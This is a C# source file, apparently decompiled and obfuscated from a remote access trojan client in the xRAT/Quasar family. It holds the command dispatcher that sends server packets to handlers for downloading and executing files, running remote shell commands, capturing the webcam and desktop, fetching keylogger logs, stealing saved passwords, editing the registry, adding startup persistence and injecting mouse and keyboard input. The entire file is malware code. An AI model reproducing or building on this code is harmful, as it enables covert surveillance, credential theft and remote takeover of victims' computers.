using System;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.ReverseProxy.Packets;

public static class GClass27
{
	public static void smethod_0(GClass33 client, GInterface4 packet)
	{
		Type type = packet.GetType();
		if (type == typeof(DoDownloadAndExecute))
		{
			GClass57.smethod_24((DoDownloadAndExecute)packet, client);
		}
		else if (type == typeof(DoUploadAndExecute))
		{
			GClass57.smethod_25((DoUploadAndExecute)packet, client);
		}
		else if (type == typeof(DoClientDisconnect))
		{
			Class0.gclass34_0.method_21();
		}
		else if (type == typeof(DoClientReconnect))
		{
			Class0.gclass34_0.method_12();
		}
		else if (type == typeof(DoClientUninstall))
		{
			GClass57.smethod_17((DoClientUninstall)packet, client);
		}
		else if (type == typeof(DoAskElevate))
		{
			GClass57.smethod_43((DoAskElevate)packet, client);
		}
		else if (type == typeof(GetDesktop))
		{
			GClass57.smethod_29((GetDesktop)packet, client);
		}
		else if (type == typeof(GetWebcam))
		{
			GClass57.smethod_12((GetWebcam)packet, client);
		}
		else if (type == typeof(GetProcesses))
		{
			GClass57.smethod_40((GetProcesses)packet, client);
		}
		else if (type == typeof(DoProcessKill))
		{
			GClass57.smethod_42((DoProcessKill)packet, client);
		}
		else if (type == typeof(DoWebcamStop))
		{
			GClass57.smethod_13((DoWebcamStop)packet, client);
		}
		else if (type == typeof(DoProcessStart))
		{
			GClass57.smethod_41((DoProcessStart)packet, client);
		}
		else if (type == typeof(GetDrives))
		{
			GClass57.smethod_34((GetDrives)packet, client);
		}
		else if (type == typeof(GetDirectory))
		{
			GClass57.smethod_18((GetDirectory)packet, client);
		}
		else if (type == typeof(DoDownloadFile))
		{
			GClass57.smethod_19((DoDownloadFile)packet, client);
		}
		else if (type == typeof(DoUploadFile))
		{
			GClass57.smethod_21((DoUploadFile)packet, client);
		}
		else if (type == typeof(DoMouseEvent))
		{
			GClass57.smethod_30((DoMouseEvent)packet, client);
		}
		else if (type == typeof(DoKeyboardEvent))
		{
			GClass57.smethod_31((DoKeyboardEvent)packet, client);
		}
		else if (type == typeof(GetSystemInfo))
		{
			GClass57.smethod_39((GetSystemInfo)packet, client);
		}
		else if (type == typeof(DoVisitWebsite))
		{
			GClass57.smethod_26((DoVisitWebsite)packet, client);
		}
		else if (type == typeof(DoShowMessageBox))
		{
			GClass57.smethod_27((DoShowMessageBox)packet, client);
		}
		else if (type == typeof(DoClientUpdate))
		{
			GClass57.smethod_16((DoClientUpdate)packet, client);
		}
		else if (type == typeof(GetWebcams))
		{
			GClass57.smethod_11((GetWebcams)packet, client);
		}
		else if (type == typeof(GetMonitors))
		{
			GClass57.smethod_32((GetMonitors)packet, client);
		}
		else if (type == typeof(DoShellExecute))
		{
			GClass57.smethod_44((DoShellExecute)packet, client);
		}
		else if (type == typeof(DoPathRename))
		{
			GClass57.smethod_23((DoPathRename)packet, client);
		}
		else if (type == typeof(DoPathDelete))
		{
			GClass57.smethod_22((DoPathDelete)packet, client);
		}
		else if (type == typeof(DoShutdownAction))
		{
			GClass57.smethod_35((DoShutdownAction)packet, client);
		}
		else if (type == typeof(GetStartupItems))
		{
			GClass57.smethod_36((GetStartupItems)packet, client);
		}
		else if (type == typeof(DoStartupItemAdd))
		{
			GClass57.smethod_37((DoStartupItemAdd)packet, client);
		}
		else if (type == typeof(DoStartupItemRemove))
		{
			GClass57.smethod_38((DoStartupItemRemove)packet, client);
		}
		else if (type == typeof(DoDownloadFileCancel))
		{
			GClass57.smethod_20((DoDownloadFileCancel)packet, client);
		}
		else if (type == typeof(DoLoadRegistryKey))
		{
			GClass57.smethod_0((DoLoadRegistryKey)packet, client);
		}
		else if (type == typeof(DoCreateRegistryKey))
		{
			GClass57.smethod_1((DoCreateRegistryKey)packet, client);
		}
		else if (type == typeof(DoDeleteRegistryKey))
		{
			GClass57.smethod_2((DoDeleteRegistryKey)packet, client);
		}
		else if (type == typeof(DoRenameRegistryKey))
		{
			GClass57.smethod_3((DoRenameRegistryKey)packet, client);
		}
		else if (type == typeof(DoCreateRegistryValue))
		{
			GClass57.smethod_4((DoCreateRegistryValue)packet, client);
		}
		else if (type == typeof(DoDeleteRegistryValue))
		{
			GClass57.smethod_5((DoDeleteRegistryValue)packet, client);
		}
		else if (type == typeof(DoRenameRegistryValue))
		{
			GClass57.smethod_6((DoRenameRegistryValue)packet, client);
		}
		else if (type == typeof(DoChangeRegistryValue))
		{
			GClass57.smethod_7((DoChangeRegistryValue)packet, client);
		}
		else if (type == typeof(GetKeyloggerLogs))
		{
			GClass57.smethod_33((GetKeyloggerLogs)packet, client);
		}
		else if (type == typeof(GetPasswords))
		{
			GClass57.smethod_28((GetPasswords)packet, client);
		}
		else if (!(type == typeof(ReverseProxyConnect)) && !(type == typeof(ReverseProxyConnectResponse)) && !(type == typeof(ReverseProxyData)) && !(type == typeof(ReverseProxyDisconnect)))
		{
			if (type == typeof(GetConnections))
			{
				GClass57.smethod_8(client, (GetConnections)packet);
			}
			else if (type == typeof(DoCloseConnection))
			{
				GClass57.smethod_9(client, (DoCloseConnection)packet);
			}
		}
		else
		{
			GClass2.smethod_0(client, packet);
		}
	}
}
